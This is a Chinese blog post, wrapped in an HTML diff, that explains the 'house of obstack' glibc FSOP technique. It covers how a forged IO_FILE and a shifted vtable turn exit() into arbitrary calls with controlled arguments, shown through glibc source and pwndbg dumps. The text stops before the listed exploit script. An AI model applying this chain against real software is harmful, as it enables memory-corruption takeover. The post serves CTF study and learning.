@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="又是从之前文档里面扒出来的一个总结，再来水一篇博客。这篇应该写的非常早了，大概是 23 年 7 月写的，当时还在卷 glibc堆，对这个 obstack 的链子印象挺深的。 house of obstack  是目前网上较多的叫法，它由国外 repr 提出，由于不确定作者给它起的名字到底是什么，姑且称它为 house of obstack。它与 house of apple 相似，主要是触发的调用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="不知从哪翻出来的 house of obstack 学习总结">
+<meta property="og:url" content="https://zikh26.github.io/posts/2ddfe893.html">
+<meta property="og:site_name" content="ZIKH26&#39;s Blog">
+<meta property="og:description" content="又是从之前文档里面扒出来的一个总结，再来水一篇博客。这篇应该写的非常早了，大概是 23 年 7 月写的，当时还在卷 glibc堆，对这个 obstack 的链子印象挺深的。 house of obstack  是目前网上较多的叫法，它由国外 repr 提出，由于不确定作者给它起的名字到底是什么，姑且称它为 house of obstack。它与 house of apple 相似，主要是触发的调用">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-11-18T15:09:31.698Z">
+<meta property="article:modified_time" content="2024-11-18T15:11:37.369Z">
+<meta property="article:author" content="ZIKH26">
+<meta property="article:tag" content="FSOP">
+<meta property="article:tag" content="house of obstack">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://zikh26.github.io/posts/2ddfe893.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://zikh26.github.io/posts/2ddfe893.html","path":"posts/2ddfe893.html","title":"不知从哪翻出来的 house of obstack 学习总结"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>不知从哪翻出来的 house of obstack 学习总结 | ZIKH26's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">ZIKH26's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-友链"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-number">3.</span> <span class="nav-text">示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2022%E6%9F%8F%E9%B9%AD%E6%9D%AF-note2"><span class="nav-number">4.</span> <span class="nav-text">2022柏鹭杯-note2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-number">4.1.</span> <span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">4.2.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP"><span class="nav-number">4.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ZIKH26"
+      src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
+  <p class="site-author-name" itemprop="name">ZIKH26</p>
+  <div class="site-description" itemprop="description">人生如戏</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">116</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">116</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/2ddfe893.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
+      <meta itemprop="name" content="ZIKH26">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZIKH26's Blog">
+      <meta itemprop="description" content="人生如戏">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="不知从哪翻出来的 house of obstack 学习总结 | ZIKH26's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          不知从哪翻出来的 house of obstack 学习总结
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-11-18 23:09:31 / 修改时间：23:11:37" itemprop="dateCreated datePublished" datetime="2024-11-18T23:09:31+08:00">2024-11-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">赛题WP</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%B5%9B%E9%A2%98WP/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>又是从之前文档里面扒出来的一个总结，再来水一篇博客。这篇应该写的非常早了，大概是 23 年 7 月写的，当时还在卷 glibc堆，对这个 <strong>obstack</strong> 的链子印象挺深的。</p>
+<p><code>house of obstack</code>  是目前网上较多的叫法，它由国外 <a target="_blank" rel="noopener" href="https://nasm.re/posts/babyfile/">repr</a> 提出，由于不确定作者给它起的名字到底是什么，姑且称它为 <code>house of obstack</code>。它与 <code>house of apple</code> 相似，主要是触发的调用链变了，但思想不变。相较于 <code>house of apple</code> 的优点是在 <code>glibc2.36</code> 依然可以使用并且布置起来更简单一些。</p>
+<span id="more"></span>
+
+<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p><code>house of obstack</code> 是 <code>large bin attack</code>（或能达到同样效果的手法也可以）+ <code>FSOP</code> 组合出来的攻击，通过 <code>large bin attack</code> 向 <code>_IO_list_all</code> 中写入一个堆地址以此来伪造一个 <strong>IO_FILE</strong> 。在 glibc2.23 之后的版本针对 <strong>IO_FILE</strong> 结构体的 <strong>vtable</strong> 地址做了检查，该手法通过小幅度改变 <strong>vtable</strong> 地址，让执行流偏离了正常的调用链，通过伪造 <strong>IO_FILE</strong> 结构体中的某些字段，最终实现任意地址执行且参数可控的效果.</p>
+<p>利用条件为：</p>
+<ol>
+<li>可以泄露 <code>libc</code> 地址和堆地址</li>
+<li>可以使用任意地址写一个堆地址（通常是使用 <code>large bin attack</code> ）</li>
+<li>可以从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li>
+</ol>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>说明： 以下的 <code>glibc</code> 源代码均来自 <code>glibc-2.36</code></p>
+<p>先来看下 exit 函数的宏观调用链</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit =&gt; __run_exit_handlers =&gt; _IO_cleanup =&gt; _IO_flush_all_lockp</span><br></pre></td></tr></table></figure>
+
+
+
+<p>第一次去改变 <code>exit</code> 正常的执行流是在这里的 <code>_IO_OVERFLOW</code> 这个宏 ，它位于 <code>_IO_flush_all_lockp</code> 函数中（如下）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line">    </span><br><span class="line">......</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>伪造 <code>IO_FILE</code> 结构体时， <code>vtable</code> 也是可控的（对这个地址做了范围的合法性检查），将原本 <code>vtable</code> 中的 <code>_IO_file_jumps</code> 改成 <code>_IO_obstack_jumps</code> 可以绕过检查（二者的距离很近）</p>
+<p><code>_IO_OVERFLOW</code> 寻找的函数指针是位于起始地址（正常情况下的 <code>_IO_file_jumps</code> ）偏移 <code>0x18</code> 的位置，因此我们只要将正常的 <code>_IO_file_jumps</code> 改成 <code>_IO_obstack_jumps+32</code> ，实际上 <code>_IO_OVERFLOW</code> 执行的就是 <code>_IO_obstack_jumps+32+0x18</code> 的函数指针，该位置的函数指针为 <code>_IO_obstack_xsputn</code> （如下）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_IO_obstack_jumps </span><br><span class="line">$<span class="number">16</span> = (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *) <span class="number">0x7ffff7e163c0</span> &lt;_IO_obstack_jumps&gt;</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7e163c0</span>+<span class="number">0x18</span>+<span class="number">32</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7e163f8</span> (_IO_obstack_jumps+<span class="number">56</span>) —▸ <span class="number">0x7ffff7c88590</span> (_IO_obstack_xsputn) ◂— endbr64 </span><br></pre></td></tr></table></figure>
+
+
+
+<p>根据上面所说的伪造完成后（要绕过检查的字段暂且不说），此时程序会执行到 <code>_IO_obstack_xsputn</code> 函数上，从该函数开始会存在一条调用链如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_IO_obstack_xsputn =&gt; _obstack_newchunk =&gt; CALL_CHUNKFUN =&gt; (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如果执行 <code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code> 时， <code>h-&gt;chunkfun</code> 是可控的地址，那就相当于能完全控制执行流了。下面通过调试来判断 <code>CALL_CHUNKFUN</code> 宏被调用时<code>h</code> 是什么</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> RAX  <span class="number">0xfbad2086</span></span><br><span class="line"> RBX  <span class="number">0x7ffff7e1a6a0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line"> RCX  <span class="number">0x0</span></span><br><span class="line"> RDX  <span class="number">0x0</span></span><br><span class="line"> RDI  <span class="number">0x7ffff7e1a6a0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line"> RSI  <span class="number">0x1</span></span><br><span class="line"> R8   <span class="number">0x7fffffffdc80</span> —▸ <span class="number">0x7ffff7e1af00</span> (initial) ◂— <span class="number">0x0</span></span><br><span class="line"> R9   <span class="number">0x20</span></span><br><span class="line"> R10  <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x7fffffffdbb0</span> —▸ <span class="number">0x7ffff7e1a6a0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line">*R12  <span class="number">0xfbad2086</span></span><br><span class="line"> R13  <span class="number">0x7ffff7e1a6a0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x7ffff7e1a6a0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line"> RBP  <span class="number">0x2</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffdbb0</span> —▸ <span class="number">0x7ffff7e1a6a0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line">*RIP  <span class="number">0x7ffff7ca773e</span> (_obstack_newchunk+<span class="number">62</span>) ◂— mov    rax, qword ptr [rdi + <span class="number">0x38</span>]</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x7ffff7ca772b</span> &lt;_obstack_newchunk+<span class="number">43</span>&gt;    movsxd rdx, dword ptr [rdi + <span class="number">0x30</span>]</span><br><span class="line">   <span class="number">0x7ffff7ca772f</span> &lt;_obstack_newchunk+<span class="number">47</span>&gt;    lea    r12, [rax + rdx + <span class="number">0x64</span>]</span><br><span class="line">   <span class="number">0x7ffff7ca7734</span> &lt;_obstack_newchunk+<span class="number">52</span>&gt;    mov    rax, qword ptr [rdi]</span><br><span class="line">   <span class="number">0x7ffff7ca7737</span> &lt;_obstack_newchunk+<span class="number">55</span>&gt;    cmp    r12, rax</span><br><span class="line">   <span class="number">0x7ffff7ca773a</span> &lt;_obstack_newchunk+<span class="number">58</span>&gt;    cmovl  r12, rax</span><br><span class="line"> ► <span class="number">0x7ffff7ca773e</span> &lt;_obstack_newchunk+<span class="number">62</span>&gt;    mov    rax, qword ptr [rdi + <span class="number">0x38</span>]  </span><br><span class="line">   <span class="number">0x7ffff7ca7742</span> &lt;_obstack_newchunk+<span class="number">66</span>&gt;    test   byte ptr [rdi + <span class="number">0x50</span>], <span class="number">1</span></span><br><span class="line">   <span class="number">0x7ffff7ca7746</span> &lt;_obstack_newchunk+<span class="number">70</span>&gt;    je     _obstack_newchunk+<span class="number">448</span>                &lt;_obstack_newchunk+<span class="number">448</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7ffff7ca774c</span> &lt;_obstack_newchunk+<span class="number">76</span>&gt;    mov    rdi, qword ptr [rdi + <span class="number">0x48</span>]</span><br><span class="line">   <span class="number">0x7ffff7ca7750</span> &lt;_obstack_newchunk+<span class="number">80</span>&gt;    mov    rsi, r12</span><br><span class="line">   <span class="number">0x7ffff7ca7753</span> &lt;_obstack_newchunk+<span class="number">83</span>&gt;    call   rax</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]─────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/zikh/Desktop/source_code/glibc<span class="number">-2.35</span>/<span class="built_in">malloc</span>/obstack.c</span><br><span class="line">   <span class="number">256</span>   new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">   <span class="number">257</span>   <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">   <span class="number">258</span>     new_size = h-&gt;chunk_size;</span><br><span class="line">   <span class="number">259</span> </span><br><span class="line">   <span class="number">260</span>   <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line"> ► <span class="number">261</span>   new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">   <span class="number">262</span>   <span class="keyword">if</span> (!new_chunk)</span><br><span class="line">   <span class="number">263</span>     (*obstack_alloc_failed_handler)();</span><br><span class="line">   <span class="number">264</span>   h-&gt;chunk = new_chunk;</span><br><span class="line">   <span class="number">265</span>   new_chunk-&gt;prev = old_chunk;</span><br><span class="line">   <span class="number">266</span>   new_chunk-&gt;limit = h-&gt;chunk_limit = (<span class="type">char</span> *) new_chunk + new_size;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上面正在执行的 <code>mov    rax, qword ptr [rdi + 0x38]  </code> 是通过 <code>h</code> 来获取 <code>h-&gt;chunkfun</code> 的值，此时的 <code>h</code> 就是 <code>rdi</code> <code>_IO_2_1_stderr_</code> 首地址（ 这里我并没有去伪造一个新的 IO_FILE ，而是在原本的 <code>_IO_2_1_stderr_</code> 结构体的基础上进行了部分字段的修改 ，也就是原本的 <code>_IO_2_1_stderr_</code>  的地址上伪造了 <code>_IO_obstack_file</code> 结构体），因为我们最初需要劫持 <code>_IO_list_all</code> ，所以遍历的第一个 <code>IO_FILE</code> 结构体都是我们可控的，自然 <code>h-&gt;chunkfun</code> 也是可控的</p>
+<p>​	</p>
+<p>再来看下 <code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code> 中的参数 <code>(h)-&gt;extra_arg</code> 如何控制，单步调试到赋值参数的位置（如下）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> RAX  <span class="number">0x555555555179</span> (backdoor) ◂— endbr64 </span><br><span class="line"> RBX  <span class="number">0x7ffff7e1a6a0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line"> RCX  <span class="number">0x0</span></span><br><span class="line"> RDX  <span class="number">0x0</span></span><br><span class="line"> RDI  <span class="number">0x7ffff7e1a6a0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line"> RSI  <span class="number">0x1</span></span><br><span class="line"> R8   <span class="number">0x7fffffffdc80</span> —▸ <span class="number">0x7ffff7e1af00</span> (initial) ◂— <span class="number">0x0</span></span><br><span class="line"> R9   <span class="number">0x20</span></span><br><span class="line"> R10  <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x7fffffffdbb0</span> —▸ <span class="number">0x7ffff7e1a6a0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line"> R12  <span class="number">0xfbad2086</span></span><br><span class="line"> R13  <span class="number">0x7ffff7e1a6a0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x7ffff7e1a6a0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line"> RBP  <span class="number">0x2</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffdbb0</span> —▸ <span class="number">0x7ffff7e1a6a0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2086</span></span><br><span class="line">*RIP  <span class="number">0x7ffff7ca774c</span> (_obstack_newchunk+<span class="number">76</span>) ◂— mov    rdi, qword ptr [rdi + <span class="number">0x48</span>]</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x7ffff7ca7737</span> &lt;_obstack_newchunk+<span class="number">55</span>&gt;    cmp    r12, rax</span><br><span class="line">   <span class="number">0x7ffff7ca773a</span> &lt;_obstack_newchunk+<span class="number">58</span>&gt;    cmovl  r12, rax</span><br><span class="line">   <span class="number">0x7ffff7ca773e</span> &lt;_obstack_newchunk+<span class="number">62</span>&gt;    mov    rax, qword ptr [rdi + <span class="number">0x38</span>]</span><br><span class="line">   <span class="number">0x7ffff7ca7742</span> &lt;_obstack_newchunk+<span class="number">66</span>&gt;    test   byte ptr [rdi + <span class="number">0x50</span>], <span class="number">1</span></span><br><span class="line">   <span class="number">0x7ffff7ca7746</span> &lt;_obstack_newchunk+<span class="number">70</span>&gt;    je     _obstack_newchunk+<span class="number">448</span>                &lt;_obstack_newchunk+<span class="number">448</span>&gt;</span><br><span class="line"> </span><br><span class="line"> ► <span class="number">0x7ffff7ca774c</span> &lt;_obstack_newchunk+<span class="number">76</span>&gt;    mov    rdi, qword ptr [rdi + <span class="number">0x48</span>]</span><br><span class="line">   <span class="number">0x7ffff7ca7750</span> &lt;_obstack_newchunk+<span class="number">80</span>&gt;    mov    rsi, r12</span><br><span class="line">   <span class="number">0x7ffff7ca7753</span> &lt;_obstack_newchunk+<span class="number">83</span>&gt;    call   rax</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7ffff7ca7755</span> &lt;_obstack_newchunk+<span class="number">85</span>&gt;    mov    r13, rax</span><br><span class="line">   <span class="number">0x7ffff7ca7758</span> &lt;_obstack_newchunk+<span class="number">88</span>&gt;    test   r13, r13</span><br><span class="line">   <span class="number">0x7ffff7ca775b</span> &lt;_obstack_newchunk+<span class="number">91</span>&gt;    je     _obstack_newchunk+<span class="number">465</span>                &lt;_obstack_newchunk+<span class="number">465</span>&gt;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]─────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/zikh/Desktop/source_code/glibc<span class="number">-2.35</span>/<span class="built_in">malloc</span>/obstack.c</span><br><span class="line">   <span class="number">256</span>   new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">   <span class="number">257</span>   <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">   <span class="number">258</span>     new_size = h-&gt;chunk_size;</span><br><span class="line">   <span class="number">259</span> </span><br><span class="line">   <span class="number">260</span>   <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line"> ► <span class="number">261</span>   new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">   <span class="number">262</span>   <span class="keyword">if</span> (!new_chunk)</span><br><span class="line">   <span class="number">263</span>     (*obstack_alloc_failed_handler)();</span><br><span class="line">   <span class="number">264</span>   h-&gt;chunk = new_chunk;</span><br><span class="line">   <span class="number">265</span>   new_chunk-&gt;prev = old_chunk;</span><br><span class="line">   <span class="number">266</span>   new_chunk-&gt;limit = h-&gt;chunk_limit = (<span class="type">char</span> *) new_chunk + new_size;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>此时的 <code>mov    rdi, qword ptr [rdi + 0x48]</code> 是进行参数的赋值， <code>rdi</code> 现在为 <code>_IO_2_1_stderr_</code> ，这意味着参数也是我们可控的。最终只要能让执行流走到这里，就能够任意地址执行并且参数可控（后续无论是执行 <code>system(&quot;/bin/sh&quot;)</code> 还是走 <code>orw</code> 都可以）</p>
+<p>下面来列一下，执行流走到这里都需要哪些字段进行伪造</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//_IO_flush_all_lockp函数</span></span><br><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure>
+
+<p>根据上面的部分得知，<code>fp-&gt;_mode &lt;= 0</code> 和 <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> 要同时满足</p>
